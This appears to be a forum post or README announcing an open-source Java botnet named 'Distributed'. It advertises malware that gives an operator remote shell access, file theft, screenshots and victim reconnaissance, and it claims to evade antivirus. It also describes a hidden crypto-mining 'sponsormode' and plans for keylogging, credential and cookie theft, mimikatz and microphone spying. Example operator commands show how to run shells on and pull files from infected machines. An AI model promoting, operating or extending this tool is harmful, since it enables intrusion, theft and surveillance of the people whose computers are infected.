It is ofical the botnet is open source :Distributed

here is a list of all the options:

it supports a 1000 users, shell acces to the infected computer, information giving about the infected computer like ( external ip, hostname, operating system and administrator or not when your on windows ), keepalive check, screenshot, downloaden and uploaden.

things that are partitional completed are: selfdestruct the virus.

the backdoor isn't seen by any viruscaner ( checked on date 11/3/2017 ).
the botnet is written in java with netbeans.

things that i didn't add are Ddos or raandsomeware.

options that i am working on are: vnc, webcam snapshot, a keylogger, Persistence backdoor, network scan likely with nmap, passwords and cookie grap ( also skype ), video on full screen that cant be closed, mimikatz, Distributed hash cracking, microfone spying, popup for credentials, script mining.

there is a option thats enabled is sponsormode that will if enabled mine for the creator but it can easly be dissabled by going in the server and change the varible sponsormode from true to false.

this are the wworking options:
list info : that will give you a detailed list of all the computers in the botnet and thee hostname, external ip, operating system, adn if on windows if it had administrator rights.
msgbox : this will give a msgbox on the targets computer.
download : here can you download a file from the infected computer to the server ( full path is needed )
upload : send a file to the computers tmp using a url.
shell : here can you type cmd commands to the computer ( the shell closes automatic when the command is completed ).
screenshot : here can you make a screenshot of the defauld screen from the infecteed computer ( will be sended to the servers)
javaversion : request version of java from infected computer.
exit : closes connection.

by thee options msgbox, download, upload, shell, screenshot, javaversion and exit you have to give the hostname and external ip to send to someone here some examples you can find the hostname and external ip easy with list info : 
minepc@1.2.3.4 shell dir C:\
minepc@1.2.3.4 msgbox hello
minepc@1.2.3.4 download C:\Users\mh123hack\Downloads\botnet-herder.jpg
minepc@1.2.3.4 upload http://thestartupmag.com/wp-content/uploads/2016/10/hacked.png
minepc@1.2.3.4 screenshot
minepc@1.2.3.4 javaversion
minepc@1.2.3.4 exit
list info

the victum is also the client open the victum with netbeans to control the botnet!

the botnet is supported for windows, linux, and maby mac but i havend tested this.
the standard port for the precompiled server ( botnet-server.jar ) is 4600 but you can change this in the source code.

i hope you like my botnet :D

dear regards.
mh123hack
litecoin: LaLRA68RC6EdUdFFxtbkgzvmTSKRyFZndk

het staat nu definitief de source code van de botnet is open source. :D 
